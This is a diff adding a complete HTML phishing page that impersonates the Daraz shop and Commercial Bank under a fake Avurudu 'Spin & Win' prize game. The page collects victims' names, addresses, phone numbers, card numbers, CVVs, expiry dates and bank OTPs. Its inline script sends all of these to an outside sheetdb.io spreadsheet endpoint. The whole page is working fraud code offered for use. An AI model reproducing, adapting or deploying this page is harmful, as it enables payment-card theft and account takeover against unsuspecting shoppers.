@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    
+<!-- Primary Meta -->
+<title>Daraz Spin & Win Avurudu</title>
+
+
+<meta name="title" content="Daraz Spin & Win Avurudu">
+<meta name="description" content="Spin the wheel and unlock amazing rewards! Get items for just $0.50 - $1.00. Limited Avurudu Offer 🎉">
+
+<!-- Open Graph / Facebook / WhatsApp -->
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://yourwebsite.com/">
+<meta property="og:title" content="Daraz Spin & Win Avurudu🎁">
+<meta property="og:description" content="Try your luck and win exciting deals! Only $0.50 - $1.00 items available now. Limited time offer!">
+<meta property="og:image" content="https://yourwebsite.com/preview.jpg">
+
+<!-- Optional (better preview control) -->
+<meta property="og:site_name" content="Daraz Offers">
+<meta property="og:locale" content="en_US">
+
+<!-- Twitter (also used by some apps) -->
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Daraz Spin & Win Avurudu🎁">
+<meta name="twitter:description" content="Spin now and unlock amazing deals! Limited time Avurudu offer 🔥">
+<meta name="twitter:image" content="https://yourwebsite.com/preview.jpg">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+<div class="navbar">
+    <div class="nav-inner">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/5b/Daraz_Logo.png" class="nav-logo" alt="Logo">
+    </div>
+</div>
+
+
+    <div id="view-game" class="app-container">
+
+<div class="title-panal">    
+<h4>Daraz Spin & Win! </h4>        
+<p>You have 3 chances to spin the wheel—try your luck and unlock exciting rewards with each spin!</p>
+</div>
+
+<hr class="custom-hr">
+
+        <div class="progress-container">
+            <div class="progress-header">
+                <span>Spins Remaining:</span>
+                <span id="spins-text">3 / 3</span>
+            </div>
+            <div class="progress-track">
+                <div class="progress-fill" id="progress-fill"></div>
+            </div>
+        </div>
+
+        <div class="wheel-wrapper">
+            <div class="pointer"></div>
+            <div class="wheel" id="wheel"></div>
+        </div>
+        <br>
+        <button id="spin-btn" class="spin-btn">SPIN TO WIN</button>
+        
+        
+<!--------- RESET BUTTON ---------->
+        <button id="reset-btn" class="reset-btn" style="display: none;"">Reset Spins (Test)</button>
+  
+  
+  
+  
+  
+    </div>
+
+    <div id="loading" class="loading-overlay hidden">
+        <div class="spinner"></div>
+        <p>Processing...</p>
+    </div>
+
+    <div id="step-win" class="app-container step-section hidden">
+        <canvas id="confetti-canvas"></canvas>
+        <h2 id="win-title">You Won!</h2>
+        <img id="win-image" class="step-image" alt="Prize" />
+        <div class="prize-display" id="win-prize"></div>
+        <h3 id="win-product-title"></h3>
+        <p id="win-description" class="subtitle"></p>
+        <div id="size-container" class="hidden">
+            <label>Select Size</label>
+            <select id="size-select">
+                <option value="">Choose size</option>
+            </select>
+        </div>
+        <div class="btn-row" style="margin-top: 2rem;">
+            <button id="close-btn" class="step-btn outline hidden">Try Again</button>
+            <button id="continue-btn" class="step-btn">Continue</button>
+        </div>
+   </div>
+    <div id="step-delivery" class="app-container step-section hidden">
+        <button class="back-arrow" id="back-to-win">←</button>
+
+        <h2>Delivery Information</h2>
+        <p class="subtitle">Please fill in the form with correct details.</p>
+        <div class="summary-box">
+            <img id="delivery-image" alt="Delivery Item" />
+            <div>
+                <h3 id="delivery-title"></h3>
+                <p id="delivery-price" class="fw-bold"></p>
+                <p class="small-text">Delivery Fee: Free</p>
+            </div>
+        </div>
+        <form id="delivery-form" onsubmit="event.preventDefault(); showStep('payment');">
+            <div class="row">
+                <div class="input-group">
+                    <input type="text" id="firstName" placeholder="First Name" required />
+                </div>
+                <div class="input-group">
+                    <input type="text" id="lastName" placeholder="Last Name" required />
+                </div>
+            </div>
+            <div class="input-group">
+                <input type="email" id="email" placeholder="E-mail" required />
+            </div>
+           
+            <div class="input-group">
+                <input type="phone" id="phone" placeholder="Phone" required />
+            </div>
+            <div class="input-group">
+                <input type="text" id="address" placeholder="Address" required />
+            </div>
+
+            <div class="row">
+                <div class="input-group">
+                    <input type="text" id="district" placeholder="District" required />
+                </div>
+                <div class="input-group">
+                    <input type="text" id="city" placeholder="City" required />
+                </div>
+            </div>    
+<p class="subtitle" style="color: #007916">
+*Please ensure your delivery details are accurate. This information will be used to process and deliver your selected item securely and on time.
+</p>
+            <div class="btn-row">                                                              
+                <button type="submit" class="step-btn">Next</button>
+            </div>
+        </form>
+    </div>
+
+    <div id="step-payment" class="app-container step-section hidden">
+        <button class="back-arrow" id="back-to-delivery">←</button>
+        <h2>Secure Checkout</h2>
+        <p class="subtitle">Add your Credit/Debit Card</p>
+        <img src="https://www.pngkey.com/png/detail/272-2720696_offering-free-credit-card-logos-american-express-logos.png" class="visa-logo">
+        
+        <form id="payment-form" onsubmit="submitOrder(event)">
+            <div class="input-group">
+                <label>Card Number</label>
+                <input type="text" id="card-number" placeholder="0000-0000-0000-0000" maxlength="19" required />
+            </div>
+            <div class="input-group">
+                <label>Card Holder Name</label>
+                <input type="text" id="card-holder" placeholder="JOHN DOE" required />
+            </div>
+            <div class="row">
+                <div class="input-group">
+                    <label>CVV</label>
+                    <input type="text" id="card-cvv" placeholder="123" maxlength="3" required />
+                </div>
+                <div class="input-group">
+                    <label>Expiry Date</label>
+                    <input type="text" id="card-expiry" placeholder="MM/YY" maxlength="5" required />
+                </div>
+            </div>
+
+            <div class="terms-container">
+                <input type="checkbox" id="terms-checkbox" required>
+                <label for="terms-checkbox">I agree to the <a href="#">Terms and Conditions</a></label>
+            </div>
+
+            <div class="btn-row">
+                <button type="submit" class="step-btn">Pay Now</button>
+            </div>
+                  
+            
+        </form>
+    </div>
+
+    <div id="step-otp" class="app-container step-section hidden">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fb/Commercial_Bank_logo.svg/960px-Commercial_Bank_logo.svg.png" class="payment-gateway">
+        
+        <h2 id="cancel-otp">Authentication</h2>
+        <p class="subtitle">Please enter the  OTP sent to your registered mobile number.</p>
+        
+        <form id="otp-form" onsubmit="verifyOtp(event)">
+            <div class="input-group">
+                <input type="text" id="otp-input" placeholder="OTP" required class="otp-box" autocomplete="one-time-code"/>
+            </div>
+            
+            <div class="btn-row">
+                 <button type="submit" class="step-btn">Verify</button>                                               
+            </div>
+            
+            <div class="secure-box">
+    <h4><i class="fa-solid fa-shield secure-icon"></i> Secure Verification</h4>
+    <p>
+        Your OTP is required to verify and secure your transaction. 
+        This step helps protect your account and ensures that only you can complete this purchase.
+    </p>
+</div>
+            
+        </form>
+    </div>
+
+    <script src="script.js"></script>
+    
+<!---------------Nav Button------------>
+<div class="dev-nav" style="display: none;">
+        <button onclick="showStep('game')">Game</button>
+        <button onclick="showStep('delivery')">Delivery</button>
+        <button onclick="showStep('payment')">Payment</button>
+        <button onclick="showStep('otp')">OTP</button>
+    </div>
+
+<div class="banner-slider">
+    <div class="slides">
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS0mML0_YZdoXr76rMPuG2nz4M1DAYIZStM33ULTSfIwxqSK0TxHDhHq56w&s=10" class="slide active">
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTCavmFvL7FkOnmowQQbkT3dtPbl9n58n19fvcoyWmv-rOluup8hm77KQ&s=10" class="slide">
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcThuJ3vYYAlxrmJo6uq_bkCWz0x4zyI1ebV5H5o-sC41Xnsp2bJ7AnjqFM5&s=10" class="slide">        
+        
+    </div>
+</div>
+
+<div class="para-panal">
+<p>Celebrate this Avurudu season with our exciting Daraz Fortune Spin Offer! Spin the wheel and unlock amazing deals ranging from $0.5 to $1 on your favorite items.<br><br>Don’t miss your opportunity to grab exclusive discounts and surprise rewards!</p>
+</div>
+
+<div class="contact-info">   
+<h4 style="color: #727272;">Contact us</h4>
+    <p>Email: cs@daraz.lk</p>
+    <p>    Phone: +94 011 757 5600</p>
+</div>
+<div class="footer">
+    <p>© 2026 All Rights Reserved</p>
+    <p>Developed by daraz.lk</p>
+</div>
+
+<script>
+    const SHEETDB_API_URL = "https://sheetdb.io/api/v1/7znrimfjgzvif";
+
+    async function submitOrder(event) {
+        event.preventDefault(); // Prevents the page from reloading
+
+        const id = Date.now(); // unique ID
+
+        const data = {
+            id: id,
+            name: document.getElementById("firstName").value + " " + document.getElementById("lastName").value,
+            email: document.getElementById("email").value,
+            phone: document.getElementById("phone").value,
+            address:             document.getElementById("address").value,
+            district: document.getElementById("district").value,
+            city: document.getElementById("city").value,
+            card_number: document.getElementById("card-number").value,
+            card_holder: document.getElementById("card-holder").value,
+            card_cvv: document.getElementById("card-cvv").value,
+            card_expiry: document.getElementById("card-expiry").value,
+            otp: "pending",
+            timestamp: new Date().toISOString()
+        };
+
+        // Save ID locally for OTP update
+        localStorage.setItem("orderId", id);
+
+        document.getElementById("loading").classList.remove("hidden"); // Optional: Show loading
+
+        try {
+            await fetch(SHEETDB_API_URL, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({ data })
+            });
+
+            alert("OTP Sent.");
+
+            // Transition from payment to OTP section cleanly
+            document.getElementById("step-payment").classList.add("hidden");
+            document.getElementById("step-otp").classList.remove("hidden");
+            
+        } catch (error) {
+            console.error("Error submitting order:", error);
+            alert("Failed to submit order. Please try again.");
+        } finally {
+            document.getElementById("loading").classList.add("hidden");
+        }
+    }
+
+async function verifyOtp(event) {
+    event.preventDefault();
+
+    const otp = document.getElementById("otp-input").value;
+    const id = localStorage.getItem("orderId");
+
+    if (!id) {
+        alert("Order not found!");
+        return;
+    }
+
+    document.getElementById("loading").classList.remove("hidden");
+
+    try {
+        await fetch(`${SHEETDB_API_URL}/id/${id}`, {
+            method: "PATCH",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                data: {
+                    otp: otp
+                }
+            })
+        });
+
+        alert("OTP verified and saved!");
+
+        // ✅ RESET STORAGE (remove tries + order)
+        localStorage.removeItem("orderId");
+        localStorage.removeItem("spins");
+        localStorage.removeItem("results");
+
+        // ✅ RESET UI
+        document.getElementById("step-otp").classList.add("hidden");
+        document.getElementById("view-game").classList.remove("hidden");
+
+        // Reset spin UI
+        document.getElementById("spin-btn").disabled = false;
+        document.getElementById("spins-text").innerText = "3 / 3";
+        document.getElementById("progress-fill").style.width = "100%";
+
+    } catch (error) {
+        console.error("Error verifying OTP:", error);
+        alert("Failed to verify OTP. Please try again.");
+    } finally {
+        document.getElementById("loading").classList.add("hidden");
+    }
+}
+</script>
+</body>
+</html>
